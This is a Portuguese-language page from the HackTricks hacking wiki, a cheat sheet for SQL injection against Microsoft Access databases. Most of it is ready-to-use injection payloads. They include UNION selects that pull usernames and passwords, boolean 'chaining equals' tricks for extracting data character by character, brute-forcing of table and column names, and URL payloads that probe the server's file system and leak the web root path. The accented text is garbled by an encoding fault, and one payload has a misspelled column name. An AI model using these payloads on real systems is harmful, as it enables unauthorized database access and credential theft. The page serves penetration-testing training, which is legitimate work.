# Inje√ß√£o SQL do MS Access

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Playground Online

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## Limita√ß√µes do DB

### Concatena√ß√£o de Strings

A concatena√ß√£o de strings √© poss√≠vel com os caracteres `& (%26)` e `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Coment√°rios

N√£o h√° coment√°rios no MS Access, mas aparentemente √© poss√≠vel remover o √∫ltimo de uma consulta com um caractere NULL:
```sql
1' union select 1,2 from table%00
```
Se isso n√£o estiver funcionando, voc√™ sempre pode corrigir a sintaxe da consulta:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Consultas Empilhadas

Elas n√£o s√£o suportadas.

### LIMIT

O operador **`LIMIT`** **n√£o est√° implementado**. No entanto, √© poss√≠vel limitar os resultados da consulta SELECT √†s **primeiras N linhas da tabela usando o operador `TOP`**. `TOP` aceita como argumento um inteiro, representando o n√∫mero de linhas a serem retornadas.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Assim como o TOP, voc√™ pode usar **`LAST`** que obter√° as **linhas do final**.

## Consultas UNION/Subconsultas

Em uma SQLi, voc√™ geralmente desejar√° de alguma forma executar uma nova consulta para extrair informa√ß√µes de outras tabelas. O MS Access sempre exige que em **subconsultas ou consultas extras um `FROM` seja indicado**.\
Portanto, se voc√™ quiser executar um `UNION SELECT` ou `UNION ALL SELECT` ou um `SELECT` entre par√™nteses em uma condi√ß√£o, voc√™ sempre **precisa indicar um `FROM` com um nome de tabela v√°lido**.\
Portanto, voc√™ precisa conhecer um **nome de tabela v√°lido**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
Isso permitir√° que voc√™ exfiltre valores da tabela atual sem precisar saber o nome da tabela.
{% endhint %}

**MS Access** permite **sintaxe estranha** como **`'1'=2='3'='asd'=false`**. Como geralmente a inje√ß√£o SQL estar√° dentro de uma cl√°usula **`WHERE`**, podemos abusar disso.

Imagine que voc√™ tem uma SQLi em um banco de dados MS Access e voc√™ sabe (ou adivinhou) que um **nome de coluna √© username**, e esse √© o campo que voc√™ deseja **exfiltrar**. Voc√™ poderia verificar as diferentes respostas do aplicativo web quando a t√©cnica de chaining equals √© usada e potencialmente exfiltrar conte√∫do com uma **inje√ß√£o booleana** usando a fun√ß√£o **`Mid`** para obter substrings.
```sql
'=(Mid(username,1,3)='adm')='
```
Se voc√™ souber o **nome da tabela** e **coluna** para despejar, pode usar uma combina√ß√£o entre `Mid`, `LAST` e `TOP` para **vazar todas as informa√ß√µes** via SQLi booleano:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Fique √† vontade para verificar isso no playground online._

### For√ßando nomes de tabelas

Usando a t√©cnica de encadeamento de iguais, voc√™ tamb√©m pode **for√ßar nomes de tabelas** com algo como:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Voc√™ tamb√©m pode usar uma maneira mais tradicional:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Fique √† vontade para verificar isso no playground online._

* Nomes de tabelas comuns do Sqlmap: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* H√° outra lista em [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### For√ßando Nomes de Colunas

Voc√™ pode **for√ßar os nomes das colunas atuais** com o truque de encadeamento de iguais com:
```sql
'=column_name='
```
Ou com um **group by**:
```sql
-1' GROUP BY column_name%00
```
Ou voc√™ pode for√ßar os nomes das colunas de uma **tabela diferente** com:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

J√° discutimos a [**t√©cnica de encadeamento de iguais**](ms-access-sql-injection.md#chaining-equals-+-substring) **para despejar dados da tabela atual e de outras tabelas**. Mas h√° outras maneiras:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Em resumo, a consulta usa uma declara√ß√£o "if-then" para acionar um "200 OK" em caso de sucesso ou um "500 Internal Error" caso contr√°rio. Aproveitando o operador TOP 10, √© poss√≠vel selecionar os primeiros dez resultados. O uso subsequente de LAST permite considerar apenas a 10¬™ tupla. Com esse valor, usando o operador MID, √© poss√≠vel realizar uma simples compara√ß√£o de caracteres. Alterando corretamente o √≠ndice de MID e TOP, podemos despejar o conte√∫do do campo "username" para todas as linhas.

### Time Based

Verifique [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Outras fun√ß√µes interessantes

* `Mid('admin',1,1)` obt√©m substring da posi√ß√£o 1 comprimento 1 (a posi√ß√£o inicial √© 1)
* `LEN('1234')` obt√©m o comprimento da string
* `ASC('A')` obt√©m o valor ascii do caractere
* `CHR(65)` obt√©m a string do valor ascii
* `IIF(1=1,'a','b')` se ent√£o
* `COUNT(*)` Conta o n√∫mero de itens

## Enumerando tabelas

De [**aqui**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) voc√™ pode ver uma consulta para obter os nomes das tabelas:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
No entanto, note que √© muito t√≠pico encontrar SQL Injections onde voc√™ **n√£o tem acesso para ler a tabela `MSysObjects`**.

## Acesso ao Sistema de Arquivos

### Caminho Completo do Diret√≥rio Raiz da Web

O conhecimento do **caminho absoluto do diret√≥rio raiz da web pode facilitar ataques posteriores**. Se os erros da aplica√ß√£o n√£o estiverem completamente ocultos, o caminho do diret√≥rio pode ser descoberto tentando selecionar dados de um banco de dados inexistente.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

O MS Access responde com uma **mensagem de erro contendo o caminho completo do diret√≥rio da web**.

### Enumera√ß√£o de Arquivos

O seguinte vetor de ataque pode ser usado para **inferir a exist√™ncia de um arquivo no sistema de arquivos remoto**. Se o arquivo especificado existir, o MS Access gera uma mensagem de erro informando que o formato do banco de dados √© inv√°lido:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Outra maneira de enumerar arquivos consiste em **especificar um item database.table**. **Se** o **arquivo especificado existir**, o MS Access exibe uma **mensagem de erro de formato de banco de dados**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Adivinha√ß√£o do Nome do Arquivo .mdb

**O nome do arquivo do banco de dados (.mdb)** pode ser inferido com a seguinte consulta:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Onde **name\[i] √© um nome de arquivo .mdb** e **realTable √© uma tabela existente** dentro do banco de dados. Embora o MS Access sempre gere uma mensagem de erro, √© poss√≠vel distinguir entre um nome de arquivo inv√°lido e um nome de arquivo .mdb v√°lido.

### Quebrador de Senha .mdb

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) √© uma ferramenta gratuita que pode ser usada para recuperar a senha principal do banco de dados do Microsoft Access 95/97/2000/XP ou Jet Database Engine 3.0/4.0.

## Refer√™ncias

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
